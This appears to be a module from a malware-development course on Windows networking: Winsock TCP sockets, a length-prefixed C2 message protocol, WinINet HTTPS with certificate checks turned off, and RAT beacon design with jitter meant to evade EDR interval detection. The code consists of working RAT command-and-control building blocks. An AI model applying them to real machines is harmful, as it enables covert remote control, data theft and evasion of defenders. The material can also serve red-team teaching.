# Module 07 — Networking

## 1. Winsock — Raw TCP Sockets

Winsock is the Windows socket API. It follows POSIX sockets closely.

**Initialize Winsock first — required:**
```cpp
#include <winsock2.h>
#include <ws2tcpip.h>
// Link: -lws2_32

WSADATA wsa;
WSAStartup(MAKEWORD(2, 2), &wsa);
// ...
WSACleanup();
```

**TCP Client:**
```cpp
SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

struct sockaddr_in addr = {};
addr.sin_family = AF_INET;
addr.sin_port   = htons(4444);  // host-to-network byte order
inet_pton(AF_INET, "192.168.1.1", &addr.sin_addr);

if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
    // connection failed
}

// Send data
const char* msg = "BEACON";
send(sock, msg, (int)strlen(msg), 0);

// Receive data
char buf[1024] = {};
int recvd = recv(sock, buf, sizeof(buf) - 1, 0);

closesocket(sock);
```

**TCP Server:**
```cpp
SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

struct sockaddr_in addr = {};
addr.sin_family      = AF_INET;
addr.sin_port        = htons(4444);
addr.sin_addr.s_addr = INADDR_ANY;  // listen on all interfaces

bind(server, (struct sockaddr*)&addr, sizeof(addr));
listen(server, 5);  // backlog = 5

struct sockaddr_in clientAddr = {};
int addrLen = sizeof(clientAddr);
SOCKET client = accept(server, (struct sockaddr*)&clientAddr, &addrLen);
// client = socket for THIS connection
// clientAddr.sin_addr = client's IP address

// Exchange data with client
// ...
closesocket(client);
closesocket(server);
```

---

## 2. Network Byte Order

Network protocols use **big-endian** byte order. x86/x64 CPUs use
**little-endian**. You must convert when putting integers into network headers.

```cpp
uint16_t port = htons(4444);   // host-to-network short
uint32_t ip   = htonl(0xC0A80101);  // host-to-network long

uint16_t p2   = ntohs(port);   // network-to-host short
```

Strings (`char*` data) are not affected — byte order applies only to integers.

---

## 3. A Simple C2 Protocol

A real C2 protocol needs framing — a way to tell where one message ends and
the next begins. The simplest approach: **length-prefixed messages**.

```
Wire format:
  [4 bytes: uint32 message length][N bytes: message data]
```

**Send:**
```cpp
bool sendMsg(SOCKET s, const std::string& data) {
    uint32_t len = htonl((uint32_t)data.size());
    // Send length prefix
    if (send(s, (char*)&len, 4, 0) != 4) return false;
    // Send data
    int sent = 0;
    while ((size_t)sent < data.size()) {
        int r = send(s, data.c_str() + sent, (int)(data.size() - sent), 0);
        if (r <= 0) return false;
        sent += r;
    }
    return true;
}
```

**Receive:**
```cpp
std::string recvMsg(SOCKET s) {
    uint32_t len = 0;
    int got = recv(s, (char*)&len, 4, MSG_WAITALL);
    if (got != 4) return "";
    len = ntohl(len);
    if (len == 0 || len > 10 * 1024 * 1024) return "";  // sanity check

    std::string data(len, '\0');
    int received = 0;
    while ((size_t)received < len) {
        int r = recv(s, &data[received], (int)(len - received), 0);
        if (r <= 0) return "";
        received += r;
    }
    return data;
}
```

**Why `MSG_WAITALL` for the length prefix?** TCP is a stream protocol — a
single `recv()` call may return fewer bytes than you asked for. `MSG_WAITALL`
tells the OS to wait until all requested bytes are available. For the data
body we use a manual loop because `MSG_WAITALL` may not be available on all
platforms.

---

## 4. WinINet — HTTPS Made Easy

Winsock requires you to implement TLS yourself. WinINet provides a high-level
HTTPS client that handles TLS automatically.

```cpp
#include <wininet.h>
// Link: -lwininet

std::string HttpGet(const char* host, const char* path, INTERNET_PORT port) {
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0",          // user agent
        INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0
    );

    HINTERNET hConnect = InternetConnectA(
        hInternet, host, port,
        nullptr, nullptr,        // username, password
        INTERNET_SERVICE_HTTP, 0, 0
    );

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (port == INTERNET_DEFAULT_HTTPS_PORT)
        flags |= INTERNET_FLAG_SECURE;

    HINTERNET hRequest = HttpOpenRequestA(
        hConnect, "GET", path,
        nullptr,  // HTTP version (default = HTTP/1.1)
        nullptr,  // referrer
        nullptr,  // accept types
        flags, 0
    );

    // Skip certificate validation (for self-signed cert on C2):
    DWORD opt = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &opt, sizeof(opt));

    HttpSendRequestA(hRequest, nullptr, 0, nullptr, 0);

    std::string response;
    char buf[4096];
    DWORD read;
    while (InternetReadFile(hRequest, buf, sizeof(buf), &read) && read > 0)
        response.append(buf, read);

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return response;
}
```

**Why WinINet for RAT C2:**
- Uses the system proxy settings (appears as normal browser traffic)
- No extra DLLs needed — wininet.dll ships with every Windows
- Handles TLS/HTTPS automatically
- Traffic on port 443 blends with normal HTTPS

---

## 5. Beacon Design

A beacon is the periodic "heartbeat" the RAT sends to the C2 server.

```
Bot → C2:  POST /beacon  { "id": "abc123", "host": "DESKTOP-XYZ", "os": "Win 11" }
C2  → Bot:  200 OK       { "cmd": "screenshot", "args": "" }
Bot → C2:  POST /result  { "id": "abc123", "cmd": "screenshot", "data": "<base64>" }
```

**Jitter:** a constant interval (e.g. exactly every 5.000 seconds) is
detectable by network monitoring. Add random jitter:

```cpp
int sleepMs = 5000 + (rand() % 3000) - 1500;  // 3.5s to 6.5s
Sleep(sleepMs);
```

**Beacon stats detection:** some EDRs compute the coefficient of variation of
beacon intervals. If CV < 0.15 (very regular) → flagged. Jitter raises CV.

---

## Exercises

- `ex01_tcp_client.cpp` — connect to a server, send/receive messages
- `ex02_tcp_server.cpp` — simple echo server that handles one client
- `ex03_wininet_https.cpp` — HTTPS GET with WinINet
- `ex04_c2_protocol.cpp` — length-prefixed message protocol client + server
